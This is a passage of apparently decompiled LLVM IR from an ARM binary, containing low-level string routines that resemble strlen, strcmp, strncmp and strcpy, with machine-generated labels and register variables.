  %or.cond3247 = or i1 %v4_f6a446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_f6b4, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_f6a81349 = phi i32 [ %v2_f6a814, %.thread4 ], [ %v1_f67c, %.preheader.preheader ]
  %v1_f6ac48.in = phi i32 [ %v1_f6ac48, %.thread4 ], [ %v1_f670, %.preheader.preheader ]
  %v1_f6ac48 = add i32 %v1_f6ac48.in, 4
  %v2_f6a814 = add i32 %v1_f6a81349, 4
  %v2_f6ac = inttoptr i32 %v1_f6ac48 to i32*
  %v3_f6ac = load i32, i32* %v2_f6ac, align 4
  %v1_f698 = urem i32 %v3_f6ac, 256
  %v2_f698 = icmp eq i32 %v1_f698, 0
  %v2_f69c = and i32 %v3_f6ac, 65280
  %v3_f69c = icmp eq i32 %v2_f69c, 0
  %or.cond = or i1 %v2_f698, %v3_f69c
  %v2_f6a0 = and i32 %v3_f6ac, 16711680
  %v3_f6a0 = icmp eq i32 %v2_f6a0, 0
  %or.cond31 = or i1 %v3_f6a0, %or.cond
  %v4_f6a4 = icmp ult i32 %v3_f6ac, 16777216
  %or.cond32 = or i1 %v4_f6a4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_f6b4, label %.thread4

dec_label_pc_f6b4:                                ; preds = %.thread4, %.preheader.preheader
  %v1_f6a813.lcssa = phi i32 [ %v1_f67c, %.preheader.preheader ], [ %v2_f6a814, %.thread4 ]
  %v2_f698.lcssa = phi i1 [ %v2_f69839, %.preheader.preheader ], [ %v2_f698, %.thread4 ]
  %v3_f69c.lcssa = phi i1 [ %v3_f69c41, %.preheader.preheader ], [ %v3_f69c, %.thread4 ]
  %v3_f6a0.lcssa = phi i1 [ %v3_f6a044, %.preheader.preheader ], [ %v3_f6a0, %.thread4 ]
  br i1 %v2_f698.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_f6b4
  %v2_f6b8 = add i32 %v1_f6a813.lcssa, 1
  br i1 %v3_f69c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_f6c017 = add i32 %v1_f6a813.lcssa, 2
  br i1 %v3_f6a0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_f6c8 = add i32 %v1_f6a813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_f6b4, %bb35, %bb36, %bb37
  %v1_f6cc = phi i32 [ %v2_f6b8, %bb35 ], [ %v2_f6c017, %bb36 ], [ %v2_f6c8, %bb37 ], [ %v1_f6a813.lcssa, %dec_label_pc_f6b4 ]
  ret i32 %v1_f6cc

; uselistorder directives
  uselistorder i32 %v1_f6a813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_f6ac, { 3, 2, 1, 0 }
  uselistorder i32 %v1_f6a4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f678, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_f6d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f6d0:
  %v2_f6dc = inttoptr i32 %arg2 to i8*
  %v3_f6dc = call i32 @function_14700(i8* %v2_f6dc, i32 %arg1)
  ret i32 %v3_f6dc
}

define i32 @function_f6e0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f6e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f6e0

dec_label_pc_f6e0:                                ; preds = %bb3, %bb
  %v0_f6e4 = phi i32 [ %v0_f6e4.pre, %bb ], [ %v5_f6e4, %bb3 ]
  %v0_f6e0 = phi i32 [ %tmp, %bb ], [ %v5_f6e0, %bb3 ]
  %v1_f6e0 = inttoptr i32 %v0_f6e0 to i8*
  %v2_f6e0 = load i8, i8* %v1_f6e0, align 1
  %v1_f6e4 = inttoptr i32 %v0_f6e4 to i8*
  %v2_f6e4 = load i8, i8* %v1_f6e4, align 1
  %v3_f6e4 = zext i8 %v2_f6e4 to i32
  %v2_f6e8 = icmp eq i8 %v2_f6e0, 0
  br i1 %v2_f6e8, label %.dec_label_pc_f6f4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_f6e0
  %v5_f6e4 = add i32 %v0_f6e4, 1
  %v5_f6e0 = add i32 %v0_f6e0, 1
  %v3_f6e0 = zext i8 %v2_f6e0 to i32
  %v10_f6ec = icmp eq i8 %v2_f6e0, %v2_f6e4
  br i1 %v10_f6ec, label %dec_label_pc_f6e0, label %dec_label_pc_f6f4

.dec_label_pc_f6f4_crit_edge:                     ; preds = %dec_label_pc_f6e0
  br label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %bb3, %.dec_label_pc_f6f4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_f6f4_crit_edge ], [ %v3_f6e0, %bb3 ]
  %v2_f6f4.pre-phi = sub nsw i32 %.pn, %v3_f6e4
  ret i32 %v2_f6f4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_f6e0, { 0, 2, 1 }
  uselistorder i32 %v0_f6e0, { 1, 0 }
  uselistorder i32 %v0_f6e4, { 1, 0 }
  uselistorder label %dec_label_pc_f6f4, { 1, 0 }
}

define i32 @function_f700() local_unnamed_addr {
dec_label_pc_f700:
  %v0_f700 = load i32, i32* @r0, align 4
  %v1_f700 = load i32, i32* @r1, align 4
  %v2_f700 = inttoptr i32 %v0_f700 to i8*
  %v3_f700 = call i32 @function_14700(i8* %v2_f700, i32 %v1_f700)
  ret i32 %v3_f700
}

define i32 @function_f710(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f710:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_f710 = icmp eq i32 %arg2, 0
  br i1 %v2_f710, label %bb, label %dec_label_pc_f724

bb:                                               ; preds = %dec_label_pc_f710
  br label %bb25

dec_label_pc_f724:                                ; preds = %dec_label_pc_f710
  %v2_f724 = add i32 %tmp, %arg2
  %v3_f724 = icmp ult i32 %v2_f724, %tmp
  br i1 %v3_f724, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_f724
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_f724, %bb19
  %v5_f7c4 = phi i32 [ %v2_f724, %dec_label_pc_f724 ], [ -1, %bb19 ]
  %v1_f7444 = urem i32 %tmp, 4
  %v2_f7445 = icmp eq i32 %v1_f7444, 0
  br i1 %v2_f7445, label %dec_label_pc_f74c, label %dec_label_pc_f734

dec_label_pc_f734:                                ; preds = %bb20, %dec_label_pc_f740
  %v0_f740 = phi i32 [ %v1_f740, %dec_label_pc_f740 ], [ %tmp, %bb20 ]
  %v1_f734 = inttoptr i32 %v0_f740 to i8*
  %v2_f734 = load i8, i8* %v1_f734, align 1
  %v2_f738 = icmp eq i8 %v2_f734, 0
  br i1 %v2_f738, label %dec_label_pc_f7c0, label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f734
  %v1_f740 = add i32 %v0_f740, 1
  %v1_f744 = urem i32 %v1_f740, 4
  %v2_f744 = icmp eq i32 %v1_f744, 0
  br i1 %v2_f744, label %dec_label_pc_f74c, label %dec_label_pc_f734

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f740, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_f740, %dec_label_pc_f740 ]
  %v3_f7b030 = icmp ult i32 %storemerge.lcssa, %v5_f7c4
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_f7b030, label %dec_label_pc_f754, label %dec_label_pc_f7c0

dec_label_pc_f754:                                ; preds = %dec_label_pc_f7ac, %dec_label_pc_f74c
  %v0_f7a437 = phi i32 [ %v4_f754, %dec_label_pc_f7ac ], [ %storemerge.lcssa, %dec_label_pc_f74c ]
  %v1_f754 = inttoptr i32 %v0_f7a437 to i32*
  %v2_f754 = load i32, i32* %v1_f754, align 4
  %v4_f754 = add i32 %v0_f7a437, 4
  %v2_f758 = add i32 %v2_f754, -16843009
  %v2_f75c = and i32 %v2_f758, -2139062144
  store i32 %v2_f75c, i32* @ip, align 4
  %v2_f760 = icmp eq i32 %v2_f75c, 0
  br i1 %v2_f760, label %dec_label_pc_f7ac, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f754
  %v2_f768 = inttoptr i32 %v0_f7a437 to i8*
  %v3_f768 = load i8, i8* %v2_f768, align 1
  %v2_f76c = icmp eq i8 %v3_f768, 0
  br i1 %v2_f76c, label %bb21, label %dec_label_pc_f77c

bb21:                                             ; preds = %dec_label_pc_f768
  br label %dec_label_pc_f7c0

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f768
  %v1_f77c = add i32 %v0_f7a437, 1
  %v2_f77c = inttoptr i32 %v1_f77c to i8*
  %v3_f77c = load i8, i8* %v2_f77c, align 1
  %v2_f780 = icmp eq i8 %v3_f77c, 0
  br i1 %v2_f780, label %dec_label_pc_f7c0, label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f77c
  %v1_f78c = add i32 %v0_f7a437, 2
  %v2_f78c = inttoptr i32 %v1_f78c to i8*
  %v3_f78c = load i8, i8* %v2_f78c, align 1
  %v2_f790 = icmp eq i8 %v3_f78c, 0
  br i1 %v2_f790, label %dec_label_pc_f7c0, label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f78c
  %v1_f79c = add i32 %v0_f7a437, 3
  %v2_f79c = inttoptr i32 %v1_f79c to i8*
  %v3_f79c = load i8, i8* %v2_f79c, align 1
  %v2_f7a0 = icmp eq i8 %v3_f79c, 0
  br i1 %v2_f7a0, label %dec_label_pc_f7c0, label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f79c, %dec_label_pc_f754
  %v3_f7b0 = icmp ult i32 %v4_f754, %v5_f7c4
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_f7b0, label %dec_label_pc_f754, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7ac, %dec_label_pc_f74c, %dec_label_pc_f734, %dec_label_pc_f77c, %dec_label_pc_f78c, %dec_label_pc_f79c, %bb21
  %v1_f7c0 = phi i32 [ %v0_f7a437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_f74c ], [ %v1_f77c, %dec_label_pc_f77c ], [ %v1_f78c, %dec_label_pc_f78c ], [ %v1_f79c, %dec_label_pc_f79c ], [ %v5_f7c4, %dec_label_pc_f7ac ], [ %v0_f740, %dec_label_pc_f734 ]
  %v3_f7c0 = icmp uge i32 %v5_f7c4, %v1_f7c0
  %v9_f7c0 = icmp eq i32 %v5_f7c4, %v1_f7c0
  %v2_f7c4 = xor i1 %v3_f7c0, true
  %v3_f7c4 = or i1 %v9_f7c0, %v2_f7c4
  br i1 %v3_f7c4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_f7c0
  %v6_f7c4 = sub i32 %v5_f7c4, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_f7c0, %bb22
  %v5_f7c8 = phi i32 [ %v1_f7c0, %dec_label_pc_f7c0 ], [ %v6_f7c4, %bb22 ]
  %v2_f7c8 = xor i1 %v9_f7c0, true
  %v3_f7c8 = and i1 %v3_f7c0, %v2_f7c8
  br i1 %v3_f7c8, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_f7c8 = sub i32 %v5_f7c8, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_f7d0 = phi i32 [ 0, %bb ], [ %v5_f7c8, %bb23 ], [ %v6_f7c8, %bb24 ]
  ret i32 %v1_f7d0

; uselistorder directives
  uselistorder i1 %v3_f7c0, { 1, 0 }
  uselistorder i32 %v4_f754, { 1, 0 }
  uselistorder i32 %v0_f7a437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_f740, { 1, 0, 2 }
  uselistorder i32 %v5_f7c4, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_f7c0, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_f734, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_f7dc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f7dc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f7dc = load i32, i32* %r2.global-to-local, align 4
  %v0_f7e0 = load i32, i32* %r0.global-to-local, align 4
  %tmp81 = icmp ult i32 %v0_f7dc, 4
  br i1 %tmp81, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_f7dc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_f7dc, %bb
  %v4_f7ec = phi i32 [ %v0_f7e0, %dec_label_pc_f7dc ], [ 0, %bb ]
  br i1 %tmp81, label %.thread41, label %dec_label_pc_f7f4

.thread41:                                        ; preds = %bb48
  br label %dec_label_pc_f8d4thread-pre-split

dec_label_pc_f7f4:                                ; preds = %bb48
  %v3_f7f4 = udiv i32 %v0_f7dc, 4
  %v0_f7fc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f89c, %dec_label_pc_f7f4
  %v0_f89c = phi i32 [ %v1_f89c, %dec_label_pc_f89c ], [ %v3_f7f4, %dec_label_pc_f7f4 ]
  %v0_f838 = phi i32 [ %v1_f894, %dec_label_pc_f89c ], [ %v0_f7fc.pre, %dec_label_pc_f7f4 ]
  %v0_f834 = phi i32 [ %v1_f88c, %dec_label_pc_f89c ], [ %v0_f7e0, %dec_label_pc_f7f4 ]
  %v1_f7f8 = inttoptr i32 %v0_f834 to i8*
  %v2_f7f8 = load i8, i8* %v1_f7f8, align 1
  %v3_f7f8 = zext i8 %v2_f7f8 to i32
  store i32 %v3_f7f8, i32* %r0.global-to-local, align 4
  %v1_f7fc = inttoptr i32 %v0_f838 to i8*
  %v2_f7fc = load i8, i8* %v1_f7fc, align 1
  %v3_f7fc = zext i8 %v2_f7fc to i32
  %v2_f800 = sub nsw i32 %v3_f7f8, %v3_f7fc
  %v9_f800 = icmp eq i8 %v2_f7f8, %v2_f7fc
  br i1 %v9_f800, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_f7f8
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_f7f8, %bb49
  %v1_f80c = phi i32 [ %v2_f800, %dec_label_pc_f7f8 ], [ 1, %bb49 ]
  %v2_f808 = icmp eq i8 %v2_f7f8, 0
  br i1 %v2_f808, label %.thread, label %bb51

.thread:                                          ; preds = %bb50
  br label %dec_label_pc_f8e0

bb51:                                             ; preds = %bb50
  %v2_f810 = icmp eq i32 %v1_f80c, 0
  br i1 %v2_f810, label %dec_label_pc_f818, label %dec_label_pc_f8e0

dec_label_pc_f818:                                ; preds = %bb51
  %v1_f818 = add i32 %v0_f834, 1
  %v2_f818 = inttoptr i32 %v1_f818 to i8*
  %v3_f818 = load i8, i8* %v2_f818, align 1
  %v4_f818 = zext i8 %v3_f818 to i32
  store i32 %v4_f818, i32* %r0.global-to-local, align 4
  %v1_f81c = add i32 %v0_f838, 1
  %v2_f81c = inttoptr i32 %v1_f81c to i8*
  %v3_f81c = load i8, i8* %v2_f81c, align 1
  %v4_f81c = zext i8 %v3_f81c to i32
  %v2_f820 = sub nsw i32 %v4_f818, %v4_f81c
  %v9_f820 = icmp eq i8 %v3_f818, %v3_f81c
  br i1 %v9_f820, label %bb53, label %bb52

bb52:                                             ; preds = %dec_label_pc_f818
  br label %bb53

bb53:                                             ; preds = %dec_label_pc_f818, %bb52
  %v1_f82c = phi i32 [ %v2_f820, %dec_label_pc_f818 ], [ 1, %bb52 ]
  %v2_f828 = icmp eq i8 %v3_f818, 0
  br i1 %v2_f828, label %bb54, label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %bb53, %bb54
  %v0_f830 = phi i32 [ %v1_f82c, %bb53 ], [ 1, %bb54 ]
  %v2_f830 = icmp eq i32 %v0_f830, 0
  br i1 %v2_f830, label %dec_label_pc_f840, label %dec_label_pc_f8e0

dec_label_pc_f840:                                ; preds = %bb55
  %v1_f840 = add i32 %v0_f834, 2
  %v2_f840 = inttoptr i32 %v1_f840 to i8*
  %v3_f840 = load i8, i8* %v2_f840, align 1
  %v4_f840 = zext i8 %v3_f840 to i32
  store i32 %v4_f840, i32* %r0.global-to-local, align 4
  %v1_f844 = add i32 %v0_f838, 2
  %v2_f844 = inttoptr i32 %v1_f844 to i8*
  %v3_f844 = load i8, i8* %v2_f844, align 1
  %v4_f844 = zext i8 %v3_f844 to i32
  %v2_f848 = sub nsw i32 %v4_f840, %v4_f844
  %v9_f848 = icmp eq i8 %v3_f840, %v3_f844
  br i1 %v9_f848, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_f840
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_f840, %bb56
  %v1_f854 = phi i32 [ %v2_f848, %dec_label_pc_f840 ], [ 1, %bb56 ]
  %v2_f850 = icmp eq i8 %v3_f840, 0
  br i1 %v2_f850, label %bb58, label %bb59

bb58:                                             ; preds = %bb57
  br label %bb59

bb59:                                             ; preds = %bb57, %bb58
  %v0_f858 = phi i32 [ %v1_f854, %bb57 ], [ 1, %bb58 ]
  %v2_f858 = icmp eq i32 %v0_f858, 0
  br i1 %v2_f858, label %dec_label_pc_f86c, label %dec_label_pc_f8e4

dec_label_pc_f86c:                                ; preds = %bb59
  %v1_f86c = add i32 %v0_f834, 3
  %v2_f86c = inttoptr i32 %v1_f86c to i8*
  %v3_f86c = load i8, i8* %v2_f86c, align 1
  %v4_f86c = zext i8 %v3_f86c to i32
  store i32 %v4_f86c, i32* %r0.global-to-local, align 4
  %v1_f870 = add i32 %v0_f838, 3
  %v2_f870 = inttoptr i32 %v1_f870 to i8*
  %v3_f870 = load i8, i8* %v2_f870, align 1
  %v4_f870 = zext i8 %v3_f870 to i32
  %v2_f874 = sub nsw i32 %v4_f86c, %v4_f870
  %v9_f874 = icmp eq i8 %v3_f86c, %v3_f870
  br i1 %v9_f874, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_f86c
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_f86c, %bb60
  %v1_f880 = phi i32 [ %v2_f874, %dec_label_pc_f86c ], [ 1, %bb60 ]
  %v2_f87c = icmp eq i8 %v3_f86c, 0
  br i1 %v2_f87c, label %bb62, label %bb63

bb62:                                             ; preds = %bb61
  br label %bb63

bb63:                                             ; preds = %bb61, %bb62
  %v0_f884 = phi i32 [ %v1_f880, %bb61 ], [ 1, %bb62 ]
  %v2_f884 = icmp eq i32 %v0_f884, 0
  %v1_f88c = add i32 %v0_f834, 4
  %v1_f894 = add i32 %v0_f838, 4
  store i32 %v1_f894, i32* @r1, align 4
  br i1 %v2_f884, label %dec_label_pc_f89c, label %dec_label_pc_f8e0

dec_label_pc_f89c:                                ; preds = %bb63
  %v1_f89c = add i32 %v0_f89c, -1
  %v7_f89c = icmp eq i32 %v0_f89c, 1
  br i1 %v7_f89c, label %dec_label_pc_f8a4, label %dec_label_pc_f7f8

dec_label_pc_f8a4:                                ; preds = %dec_label_pc_f89c
  %v1_f8a4 = urem i32 %v0_f7dc, 4
  store i32 %v1_f8a4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f8d4

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f8d4
  %v1_f8ac = inttoptr i32 %v0_f8cc to i8*
  %v2_f8ac = load i8, i8* %v1_f8ac, align 1
  %v3_f8ac = zext i8 %v2_f8ac to i32
  store i32 %v3_f8ac, i32* %r0.global-to-local, align 4
  %v0_f8b0 = load i32, i32* @r1, align 4
  %v1_f8b0 = inttoptr i32 %v0_f8b0 to i8*
  %v2_f8b0 = load i8, i8* %v1_f8b0, align 1
  %v3_f8b0 = zext i8 %v2_f8b0 to i32
  %v2_f8b4 = sub nsw i32 %v3_f8ac, %v3_f8b0
  %v9_f8b4 = icmp eq i8 %v2_f8ac, %v2_f8b0
  br i1 %v9_f8b4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_f8ac
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_f8ac, %bb64
  %v1_f8c0 = phi i32 [ %v2_f8b4, %dec_label_pc_f8ac ], [ 1, %bb64 ]
  %v2_f8bc = icmp eq i8 %v2_f8ac, 0
  br i1 %v2_f8bc, label %.thread6, label %bb66

.thread6:                                         ; preds = %bb65
  br label %dec_label_pc_f8e0

bb66:                                             ; preds = %bb65
  %v2_f8c4 = icmp eq i32 %v1_f8c0, 0
  br i1 %v2_f8c4, label %dec_label_pc_f8cc, label %dec_label_pc_f8e0

dec_label_pc_f8cc:                                ; preds = %bb66
  %v1_f8cc = add i32 %v0_f8cc, 1
  %v1_f8d0 = add i32 %v0_f8b0, 1
  store i32 %v1_f8d0, i32* @r1, align 4
  br label %dec_label_pc_f8d4thread-pre-split

dec_label_pc_f8d4thread-pre-split:                ; preds = %.thread41, %dec_label_pc_f8cc
  %v1_f8e038 = phi i32 [ %v3_f8ac, %dec_label_pc_f8cc ], [ %v4_f7ec, %.thread41 ]
  %v0_f8e033 = phi i32 [ %v3_f8b0, %dec_label_pc_f8cc ], [ %v4_f7ec, %.thread41 ]
  %v0_f8ac28 = phi i32 [ %v1_f8cc, %dec_label_pc_f8cc ], [ %v0_f7e0, %.thread41 ]
  %v0_f8d4.pr = phi i32 [ %v1_f8d8, %dec_label_pc_f8cc ], [ %v0_f7dc, %.thread41 ]
  br label %dec_label_pc_f8d4

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8d4thread-pre-split, %dec_label_pc_f8a4
  %v1_f8e037 = phi i32 [ %v1_f8e038, %dec_label_pc_f8d4thread-pre-split ], [ %v4_f86c, %dec_label_pc_f8a4 ]
  %v0_f8e032 = phi i32 [ %v0_f8e033, %dec_label_pc_f8d4thread-pre-split ], [ %v4_f870, %dec_label_pc_f8a4 ]
  %v0_f8cc = phi i32 [ %v0_f8ac28, %dec_label_pc_f8d4thread-pre-split ], [ %v1_f88c, %dec_label_pc_f8a4 ]
  %v0_f8d8 = phi i32 [ %v0_f8d4.pr, %dec_label_pc_f8d4thread-pre-split ], [ %v1_f8a4, %dec_label_pc_f8a4 ]
  %v2_f8d4 = icmp eq i32 %v0_f8d8, 0
  %v1_f8d8 = add i32 %v0_f8d8, -1
  store i32 %v1_f8d8, i32* %r2.global-to-local, align 4
  br i1 %v2_f8d4, label %dec_label_pc_f8e0, label %dec_label_pc_f8ac

dec_label_pc_f8e0:                                ; preds = %bb63, %bb55, %bb51, %.thread6, %.thread, %bb66, %dec_label_pc_f8d4
  %v1_f8e0 = phi i32 [ 0, %.thread6 ], [ 0, %.thread ], [ %v3_f8ac, %bb66 ], [ %v1_f8e037, %dec_label_pc_f8d4 ], [ %v4_f86c, %bb63 ], [ %v4_f818, %bb55 ], [ %v3_f7f8, %bb51 ]
  %v0_f8e0 = phi i32 [ %v3_f8b0, %.thread6 ], [ %v3_f7fc, %.thread ], [ %v3_f8b0, %bb66 ], [ %v0_f8e032, %dec_label_pc_f8d4 ], [ %v4_f870, %bb63 ], [ %v4_f81c, %bb55 ], [ %v3_f7fc, %bb51 ]
  %v2_f8e0 = sub i32 %v1_f8e0, %v0_f8e0
  br label %dec_label_pc_f8e4

dec_label_pc_f8e4:                                ; preds = %bb59, %dec_label_pc_f8e0
  %storemerge = phi i32 [ %v2_f8e0, %dec_label_pc_f8e0 ], [ %v2_f848, %bb59 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_f8d8, { 1, 0 }
  uselistorder i32 %v0_f8cc, { 1, 0 }
  uselistorder i32 %v1_f8a4, { 1, 0 }
  uselistorder i32 %v1_f894, { 1, 0 }
  uselistorder i32 %v0_f7dc, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_f8e4, { 1, 0 }
  uselistorder label %dec_label_pc_f8e0, { 6, 5, 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_f8d4thread-pre-split, { 1, 0 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_f8ec(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f8ec:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v0_f8fc1 = load i32, i32* @r1, align 4
  %v1_f8fc2 = inttoptr i32 %v0_f8fc1 to i8*
  %v2_f8fc3 = load i8, i8* %v1_f8fc2, align 1
  %v2_f9005 = icmp eq i8 %v2_f8fc3, 0
  store i1 %v2_f9005, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_f8fc3, i8* %arg1, align 1
  br i1 %v2_f9005, label %dec_label_pc_f90c, label %dec_label_pc_f8f4

dec_label_pc_f8f4:                                ; preds = %dec_label_pc_f8ec, %dec_label_pc_f8f4
  %v0_f8f4 = load i32, i32* @r1, align 4
  %v1_f8f4 = add i32 %v0_f8f4, 1
  store i32 %v1_f8f4, i32* @r1, align 4
  %v0_f8f8 = load i32, i32* @r2, align 4
  %v1_f8f8 = add i32 %v0_f8f8, 1
  store i32 %v1_f8f8, i32* @r2, align 4
  %v1_f8fc = inttoptr i32 %v1_f8f4 to i8*
  %v2_f8fc = load i8, i8* %v1_f8fc, align 1
  %v2_f900 = icmp eq i8 %v2_f8fc, 0
  store i1 %v2_f900, i1* %cpsr_z.global-to-local, align 1
  %v3_f904 = inttoptr i32 %v1_f8f8 to i8*
  store i8 %v2_f8fc, i8* %v3_f904, align 1
  %v0_f908 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f908, label %dec_label_pc_f90c, label %dec_label_pc_f8f4

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8f4, %dec_label_pc_f8ec
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_f8f4, { 1, 0 }
}

define i32 @function_f910(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f910:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_f910 = icmp eq i32 %arg2, 3
  store i1 %v7_f910, i1* %cpsr_z.global-to-local, align 1
  %v0_f914 = load i32, i32* @lr, align 4
  store i32 %v0_f914, i32* %stack_var_-4, align 4
  %v1_f918 = add i32 %arg1, -1
  store i32 %v1_f918, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_f994, label %dec_label_pc_f920

dec_label_pc_f920:                                ; preds = %dec_label_pc_f910
  %v3_f920 = udiv i32 %arg2, 4
  store i32 %v3_f920, i32* %lr.global-to-local, align 4
  %v0_f924.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %dec_label_pc_f970, %dec_label_pc_f920
  %v2_f92c = phi i32 [ %v6_f964, %dec_label_pc_f970 ], [ %v1_f918, %dec_label_pc_f920 ]
  %v0_f924 = phi i32 [ %v1_f974, %dec_label_pc_f970 ], [ %v0_f924.pre, %dec_label_pc_f920 ]
  %v1_f924 = inttoptr i32 %v0_f924 to i8*
  %v2_f924 = load i8, i8* %v1_f924, align 1
  %v3_f924 = zext i8 %v2_f924 to i32
  store i32 %v3_f924, i32* %r3.global-to-local, align 4
  %v2_f928 = icmp eq i8 %v2_f924, 0
  store i1 %v2_f928, i1* %cpsr_z.global-to-local, align 1
  %v3_f92c = add i32 %v2_f92c, 1
  %v4_f92c = inttoptr i32 %v3_f92c to i8*
  store i8 %v2_f924, i8* %v4_f92c, align 1
  %v5_f92c = load i32, i32* @ip, align 4
  %v6_f92c = add i32 %v5_f92c, 1
  store i32 %v6_f92c, i32* @ip, align 4
  %v0_f930 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f930, label %dec_label_pc_f980, label %dec_label_pc_f934

dec_label_pc_f934:                                ; preds = %dec_label_pc_f924
  %v0_f934 = load i32, i32* @r1, align 4
  %v1_f934 = add i32 %v0_f934, 1
  %v2_f934 = inttoptr i32 %v1_f934 to i8*
